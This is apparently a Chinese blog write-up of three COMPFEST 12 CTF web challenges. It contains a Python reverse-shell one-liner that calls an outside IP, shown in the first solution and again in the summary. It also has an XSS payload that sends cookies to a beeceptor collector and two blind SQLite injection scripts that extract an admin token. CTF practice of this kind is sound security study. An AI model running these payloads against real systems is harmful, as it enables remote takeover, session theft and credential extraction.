前几天没事打了国外的一个 CTF 比赛( COMPFEST CTF  )，web 部分对新手挺友好的，在这里做个记录

# Super Judge

题目描述

> We tried to recreate competitive programming online judge for python only, but failed miserably, and by miserably, fatal failure. What's the bug? see if you can find it out!


看到是一个文件上传的页面

![](https://i.loli.net/2020/09/19/kPJeF2hUmgswncO.jpg)

随便上传一个文件试一试，返回了django的debug页面

![](https://i.loli.net/2020/09/19/XLQF8iNdhlpEJWB.jpg)

![](https://i.loli.net/2020/09/19/ZzkQn6ILcipyxUM.jpg)

在该页面可以看到一些源码，大意是把上传文件的内容用 exec 执行，因为这里并没有回显，可以直接尝试反弹 shell

![](https://i.loli.net/2020/09/19/1EHUKiQrGsgy8MW.jpg)

payload : 

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('47.95.217.198',20000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);
```

![](https://i.loli.net/2020/09/19/zmEKWMOL1h2FyCg.jpg)

![](https://i.loli.net/2020/09/19/s8Xz1R3vJ7GUAjr.jpg)

flag : COMPFEST12{f4k3_5up312_u53r_hUH_?}

# Regular Forum Page

题目描述

> Check out my sweet new forum page! Mods will check often in to prevent bad things from happening.


![](https://i.loli.net/2020/09/19/BIAn51zm7M8WXwZ.jpg)

注册登陆

![](https://i.loli.net/2020/09/19/9Yyn5Ho6TSCwgDA.jpg)

创建一个表格，在评论处存在xss

![](https://i.loli.net/2020/09/19/d48USntRh9rMGvN.jpg)

![](https://i.loli.net/2020/09/19/OU5fFexXIAuoGlp.jpg)

![](https://i.loli.net/2020/09/19/WFs23tIyvLTNzYO.jpg)

根据题目描述，大概意思就是要窃取cookie，到 https://beeceptor.com/ 注册一个临时子域名接收 cookie

payload如下

```html
><img src=1 onerror="window.location.href='https://peri0d.free.beeceptor.com/?get='+document.cookie">
```

![](https://i.loli.net/2020/09/19/KxykpuGNEolbdqc.jpg)

![](https://i.loli.net/2020/09/19/wzGTciOEhl6Bek8.jpg)

# NoPass

题目描述

> Forgets your password! We've already invent secure login system. One account only can log on in one device. The flag is the token of admin.
> P.S: Choose unique username to avoid duplicate.
>
> 128.199.157.172:28337
>
> Difficulty: Medium


hint

> I think the token is saved in database


![](https://i.loli.net/2020/09/19/XtngqpufLyAzZbO.jpg)

登陆之后界面如下

![](https://i.loli.net/2020/09/19/mOjb8TVWZyJI3sD.jpg)

访问 flag 提示没有权限

![](https://i.loli.net/2020/09/19/SqPDidEo7xKN2eO.jpg)

根据提示说 token 保存在数据库，发现这里请求头的 token 处存在 SQLite3 的注入

![](https://i.loli.net/2020/09/19/Io9aLgiGmJjSADc.jpg)

可以写个脚本用二分法进行盲注，可以获取表名 django_migrations,sqlite_sequence,django_content_type,nopass_login_account

```python
import requests

url = 'http://128.199.157.172:28337/flag'

# token=9Utongvpml4hI84sG8aLYFm5UTryfHEM' or unicode(substr((select group_concat(name) from sqlite_master where type='table'),1,1))=100 or '1'='0
def get_name():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            payload = f"token=9Utongvpml4hI84sG8aLYFm5UTryfHEM' or unicode(substr((select group_concat(name) from sqlite_master where type='table'),{i},1))>{mid} or '1'='0" 
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
                'Cookie': payload
            }
            # print(headers)
            r = requests.get(url=url, headers=headers)
            # print(r.text)

            if 'Error: Permission Denied' in r.text:
                high = mid
            else:
                low = mid + 1
                
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
get_name()
```

不难判断要获取 nopass_login_account 表的数据，先获取 nopass_login_account 的信息，它的 tbl_name 为 nopass_login_account，它的 sql 为

```sqlite
CREATE TABLE "nopass_login_account" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "token" varchar(200) NOT NULL UNIQUE, "username" varchar(50) NOT NULL UNIQUE, "is_admin" bool NOT NULL)
```

先去盲注一下 is_admin 字段，发现第一行数据就是 1 ，然后再盲注该行数据的 token 字段

```python
import requests

url = 'http://128.199.157.172:28337/flag'

# token=9Utongvpml4hI84sG8aLYFm5UTryfHEM' or unicode(substr((select group_concat(name) from sqlite_master where type='table'),1,1))=100 or '1'='0
def get_name():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            # payload = f"token=9Utongvpml4hI84sG8aLYFm5UTryfHEM' or unicode(substr((select group_concat(is_admin) from nopass_login_account),{i},1))>{mid} or '1'='0"
            
            payload = f"token=9Utongvpml4hI84sG8aLYFm5UTryfHEM' or unicode(substr((select group_concat(token) from nopass_login_account where is_admin=1),{i},1))>{mid} or '1'='0"
            
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
                'Cookie': payload
            }

            # print(headers)
            r = requests.get(url=url, headers=headers)
            # print(r.text)

            if 'Error: Permission Denied' in r.text:
                high = mid
            else:
                low = mid + 1
                
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
get_name()
```

![](https://i.loli.net/2020/09/19/P3s7xgrCHLei9k6.jpg)

# 小结

- python 反弹 shell

  ```python
  import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.95.217.198",20000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
  ```

- SQLite 手工注入，隐藏表为 sqlite_master，其中 name 存放的是所有表名，其对应的 sql 存放的是建表语句

- sqlite_master 中的 name , tbl_name , sql 都可以看一下

